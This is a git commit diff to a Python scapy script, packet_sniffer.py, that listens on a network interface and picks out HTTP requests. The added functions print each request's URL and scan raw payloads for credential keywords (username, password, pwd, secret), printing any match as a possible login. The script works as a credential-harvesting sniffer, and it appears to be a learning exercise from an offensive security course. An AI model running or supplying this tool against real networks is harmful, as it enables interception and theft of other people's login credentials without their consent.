53ce5ecadbdd532c6f7b8dd2a7e8d46365212df2
Corvus0x02 <Corvus0x02@protonmail.com>
2022-08-16 14:22:07 -0400

    Updated

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -10,12 +10,28 @@ from scapy.layers.http import *
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
+def get_url(packet):
+    host = packet[HTTPRequest].Host
+    path = packet[HTTPRequest].Path
+    url = host + path
+    return url
+
+def get_login_info(packet):
+    if packet.haslayer(Raw):
+        load = packet[Raw].load.decode()
+        keywords = ["username", "user", "name", "password", "pass", "pwd", "pw=", "secret"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
+
 def process_sniffed_packet(packet):
     #Sniff for HTTP POST Requests
     if packet.haslayer(HTTPRequest):
-        if packet.haslayer(Raw):
-            print(packet.show())
-            print(packet[Raw].load)
+        url = get_url(packet)
+        print("[+] HTTP Request >> ", url)
+        login_info = get_login_info(packet)
+        if login_info:
+            print("[+] Possible Username/Password >", login_info, "\n")
     #Sniff for Cookies in HTTP Responses
     #if packet.haslayer(HTTPResponse):
 sniff("eth0")
